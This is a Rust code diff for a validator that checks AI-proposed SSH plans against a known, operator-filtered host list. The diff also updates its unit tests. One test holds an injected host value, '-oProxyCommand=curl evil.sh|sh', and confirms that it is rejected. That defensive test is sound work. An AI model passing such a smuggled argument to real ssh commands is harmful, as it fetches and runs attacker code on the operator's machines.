@@ -83,7 +83,30 @@ pub struct StepRequest {
 ///
 /// Every error here is returned to the model as a tool result, so it can fix
 /// the proposal rather than the turn simply failing.
-pub fn resolve(id: u64, req: PlanRequest, known: &[(i64, String)]) -> Result<Plan, String> {
+/// What an unknown-host refusal says about the hosts there are. Under the
+/// operator's filter it says the list is filtered and names only what is
+/// available — the same words for every unknown name, so a refusal cannot be
+/// used to learn whether a hidden host exists — and never what the filter is.
+pub fn hosts_available(names: &[&str], filtered: bool) -> String {
+    match (filtered, names.is_empty()) {
+        (false, _) => format!("Known hosts: {}.", names.join(", ")),
+        (true, true) => "The operator has filtered the host list, and no host available to \
+                         you matches it. If the task needs one, ask them to change or clear it."
+            .to_string(),
+        (true, false) => format!(
+            "The operator has filtered the host list; the hosts available to you are: {}. \
+             If the task needs another, ask them to clear the filter.",
+            names.join(", ")
+        ),
+    }
+}
+
+pub fn resolve(
+    id: u64,
+    req: PlanRequest,
+    known: &[(i64, String)],
+    filtered: bool,
+) -> Result<Plan, String> {
     if req.steps.is_empty() {
         return Err("a plan needs at least one step".to_string());
     }
@@ -106,14 +129,11 @@ pub fn resolve(id: u64, req: PlanRequest, known: &[(i64, String)]) -> Result<Pla
                     }
                 }
                 None => {
+                    let names: Vec<&str> = known.iter().map(|(_, n)| n.as_str()).collect();
                     return Err(format!(
-                        "step {} names an unknown host {name:?}. Known hosts: {}.",
+                        "step {} names an unknown host {name:?}. {}",
                         i + 1,
-                        known
-                            .iter()
-                            .map(|(_, n)| n.as_str())
-                            .collect::<Vec<_>>()
-                            .join(", ")
+                        hosts_available(&names, filtered)
                     ));
                 }
             }
@@ -163,6 +183,7 @@ mod tests {
                 {"summary":"restart","kind":"scriptlet","script":"systemctl restart nginx",
                  "hosts":["web-01","web-02"]}]}"#),
             &known(),
+            false,
         )
         .unwrap();
         assert_eq!(p.id, 3);
@@ -178,6 +199,7 @@ mod tests {
             1,
             req(r#"{"steps":[{"kind":"upload","artifact":"hotfix.sh","hosts":["db-main"]}]}"#),
             &known(),
+            false,
         )
         .unwrap();
         assert_eq!(
@@ -191,6 +213,22 @@ mod tests {
         assert_eq!(p.steps[0].summary, "step 1");
     }
 
+    /// Under the operator's filter, the refusal says the list is filtered and
+    /// names only what is available.
+    #[test]
+    fn an_unknown_host_under_a_filter_says_the_list_is_filtered() {
+        let known = vec![(1, "web-01".to_string())];
+        let e = resolve(
+            1,
+            req(r#"{"steps":[{"kind":"scriptlet","script":"id","hosts":["db-main"]}]}"#),
+            &known,
+            true,
+        )
+        .unwrap_err();
+        assert!(e.contains("filtered the host list"), "{e}");
+        assert!(e.contains("available to you are: web-01."), "{e}");
+    }
+
     /// A name the model invented must not become an ssh target.
     #[test]
     fn an_unknown_host_fails_the_whole_proposal() {
@@ -198,6 +236,7 @@ mod tests {
             1,
             req(r#"{"steps":[{"kind":"scriptlet","script":"id","hosts":["web-01","ghost"]}]}"#),
             &known(),
+            false,
         )
         .unwrap_err();
         assert!(e.contains("unknown host \"ghost\""), "{e}");
@@ -212,6 +251,7 @@ mod tests {
             req(r#"{"steps":[{"kind":"scriptlet","script":"id",
                     "hosts":["-oProxyCommand=curl evil.sh|sh"]}]}"#),
             &known(),
+            false,
         )
         .unwrap_err();
         assert!(e.contains("unknown host"), "{e}");
@@ -220,7 +260,7 @@ mod tests {
     #[test]
     fn empty_plans_steps_and_scripts_are_refused() {
         assert!(
-            resolve(1, req(r#"{"steps":[]}"#), &known())
+            resolve(1, req(r#"{"steps":[]}"#), &known(), false)
                 .unwrap_err()
                 .contains("at least one step")
         );
@@ -228,7 +268,8 @@ mod tests {
             resolve(
                 1,
                 req(r#"{"steps":[{"kind":"scriptlet","script":"id","hosts":[]}]}"#),
-                &known()
+                &known(),
+                false
             )
             .unwrap_err()
             .contains("names no hosts")
@@ -237,7 +278,8 @@ mod tests {
             resolve(
                 1,
                 req(r#"{"steps":[{"kind":"scriptlet","script":"  ","hosts":["web-01"]}]}"#),
-                &known()
+                &known(),
+                false
             )
             .unwrap_err()
             .contains("empty script")
@@ -251,6 +293,7 @@ mod tests {
             req(r#"{"steps":[{"kind":"scriptlet","script":"id",
                     "hosts":["web-01","web-01","web-02"]}]}"#),
             &known(),
+            false,
         )
         .unwrap();
         assert_eq!(p.steps[0].hosts, vec![1, 2]);
@@ -264,6 +307,7 @@ mod tests {
                     {"kind":"scriptlet","script":"a","hosts":["web-01","web-02"]},
                     {"kind":"scriptlet","script":"b","hosts":["web-02","db-main"]}]}"#),
             &known(),
+            false,
         )
         .unwrap();
         assert_eq!(p.steps.len(), 2);
